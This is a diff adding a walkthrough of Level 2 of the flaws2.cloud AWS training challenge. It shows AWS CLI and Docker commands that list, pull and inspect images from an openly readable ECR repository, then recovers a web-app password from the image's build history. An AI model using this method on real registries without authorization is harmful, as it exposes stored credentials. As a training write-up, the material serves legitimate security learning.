@@ -479,7 +479,32 @@ Navigated to level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html to
 
 ### Level 2
 
+> This next level is running as a container at http://container.target.flaws2.cloud/. Just like S3 buckets, other resources on AWS can have open permissions.
 
+Enumerate repository and images
+
+```bash
+aws ecr list-images --repository-name level2
+aws ecr describe-images --repository-name level2
+```
+
+Download and inspect the image:
+
+```bash
+# Docker commands
+aws ecr get-login
+docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
+docker inspect level2
+docker inspect sha256:079aee8a89950717cdccd15b8f17c80e9bc4421a855fcdc120e1c534e4c102e0
+docker image history level2
+docker history --no-trunc sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621
+
+# AWS CLI
+aws ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest | jq '.images[].imageManifest | fromjson'
+aws ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:edfaad38ac10904ee76c81e343abf88f22e6cfc7413ab5a8e4aeffc6a7d9087a"
+```
+
+Looking at the image history and inspecting the commands a username and password can be identified and used to login into the web application `RUN htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password`
 
 ### Level 3
 
